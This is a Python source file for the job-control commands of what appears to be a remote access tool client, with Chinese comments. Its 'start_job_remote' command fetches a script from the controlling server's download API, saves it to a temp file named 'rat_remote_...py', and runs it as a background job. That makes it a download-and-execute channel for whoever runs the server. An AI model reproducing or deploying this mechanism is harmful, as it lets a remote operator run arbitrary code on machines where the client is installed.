import os
import tempfile
import uuid

from client.config.config import UPLOAD_BASE_URL
from core.utils.decorator import desc
from core.utils.formatting import format_dict


class CommandJobMixin:
    @desc('Start a background job', group='job')
    def start_job(self, job_name: str):
        """
        启动后台任务。
        不传任务名时，列出可用任务。
        """
        job_name = job_name.strip()
        job_manager = self.socket.job_manager

        if not job_name:
            available_jobs = job_manager.list_available_jobs()
            if not available_jobs:
                return 1, 'No job modules available'
            return 1, '\n'.join(available_jobs)

        try:
            self._send_interim_result(1, f'Preparing background job: {job_name}')
            runtime = job_manager.start_job(job_name, self.command_id)

            self._send_final_result(
                1,
                f'Background job started: {runtime.display_name}\n'
                f'Thread: {runtime.thread.name}\n'
                f'Use "stop_job {runtime.job_key}" to request stop'
            )
        except Exception as e:
            return 0, f'Failed to start background job: {e}'

    @desc('Stop a background job', group='job')
    def stop_job(self, job_name: str):
        """
        停止后台任务。
        不传任务名时，列出当前运行中的任务。
        """
        job_name = job_name.strip()
        job_manager = self.socket.job_manager

        if not job_name:
            running_jobs = job_manager.list_running_jobs()
            if not running_jobs:
                return 1, 'No background jobs are currently running'
            return 1, '\n'.join(running_jobs)

        try:
            runtime = job_manager.stop_job(job_name)
            return 1, f'Stop request sent: {runtime.display_name}'
        except Exception as e:
            return 0, f'Failed to stop background job: {e}'

    @desc('List running background jobs', group='job')
    def jobs(self):
        """
        列出当前运行中的后台任务。
        """
        job_manager = self.socket.job_manager
        running_jobs = job_manager.list_running_jobs()
        if not running_jobs:
            return 1, 'No background jobs are currently running'
        return 1, '\n'.join(running_jobs)

    @desc('Show background job status', group='job')
    def job_status(self, job_name: str):
        """
        查看指定后台任务状态。
        """
        job_name = job_name.strip()
        job_manager = self.socket.job_manager
        if not job_name:
            return 0, 'Usage: job_status <job_name>'

        try:
            status_info = job_manager.get_job_status(job_name)
            return 1, format_dict(status_info)
        except Exception as e:
            return 0, f'Failed to query background job status: {e}'

    @desc('Stop all background jobs', group='job')
    def stop_all_jobs(self):
        """
        停止所有后台任务。
        """
        try:
            job_manager = self.socket.job_manager
            stopped_jobs = job_manager.stop_all_jobs()
            if not stopped_jobs:
                return 1, 'No background jobs are currently running'
            return 1, 'Stop request sent for:\n' + '\n'.join(stopped_jobs)
        except Exception as e:
            return 0, f'Failed to stop background jobs: {e}'

    @desc('Start a background job from server-script', group='job')
    def start_job_remote(self, job_name: str, extra: dict = None):
        """
        启动后台任务（服务端下发版本）。
        """
        job_name = job_name.strip()
        job_manager = self.socket.job_manager

        if not job_name:
            # 列出可用远程脚本
            return self._list_remote_scripts()

        try:
            self._send_interim_result(1, f'Fetching remote script: {job_name}')
            script_content = self._fetch_remote_script(job_name)
            self._start_from_script_content(script_content, job_name, job_manager)
        except Exception as e:
            return 0, f'Failed to start remote job: {e}'

    def _start_from_script_content(self, script_content: str, script_name: str, job_manager):
        """
        从脚本内容启动任务
        """
        try:
            temp_dir = tempfile.gettempdir()
            if not script_name.endswith('.py'):
                script_name = f'{script_name}.py'

            temp_filename = f'rat_remote_{uuid.uuid4().hex[:8]}.py'
            temp_path = os.path.join(temp_dir, temp_filename)

            with open(temp_path, 'w', encoding='utf-8') as f:
                f.write(script_content)

            self._send_interim_result(1, f'Preparing background job from remote script: {script_name}')

            # 使用临时文件的完整路径启动 job
            runtime = job_manager.start_job_rem(temp_path, script_name.strip(".py"), self.command_id)

            if hasattr(runtime, 'job_instance'):
                runtime.job_instance._temp_script_path = temp_path

            self._send_final_result(
                1,
                f'Background job started from remote script: {script_name}\n'
                f'Thread: {runtime.thread.name}\n'
                f'Use "stop_job {runtime.job_key}" to request stop'
            )
        except Exception as e:
            # 清理临时文件
            if 'temp_path' in locals() and os.path.exists(temp_path):
                try:
                    os.remove(temp_path)
                except:
                    pass
            return 0, f'Failed to start from script: {e}'

    def _fetch_remote_script(self, script_name: str) -> str:
        """
        从服务端 API 获取脚本内容
        """
        import requests
        from client.config.config import SERVER_ADDR

        # 构建服务端 API URL
        base_url = UPLOAD_BASE_URL
        url = f'{base_url}/api/server/jobs/download'

        print(url)

        # 发送请求
        response = requests.get(
            url,
            params={'name': script_name},
            timeout=30
        )

        if response.status_code != 200:
            raise RuntimeError(f'Failed to download script: {response.text}')

        return response.text

    def _list_remote_scripts(self) -> tuple[int, str]:
        """
        列出服务端可用的远程脚本
        """
        import requests
        from client.config.config import SERVER_ADDR

        base_url = UPLOAD_BASE_URL
        url = f'{base_url}/api/server/jobs/list'

        try:
            response = requests.get(url, timeout=10)
            if response.status_code != 200:
                return 0, 'Failed to fetch remote script list'

            data = response.json()
            scripts = data.get('scripts', [])

            if not scripts:
                return 1, 'No remote scripts available'

            lines = ['Available remote scripts:']
            for script in scripts:
                lines.append(f'  {script["name"]} - {script.get("description", "No description")}')
            return 1, '\n'.join(lines)
        except Exception as e:
            return 0, f'Failed to fetch remote script list: {e}'
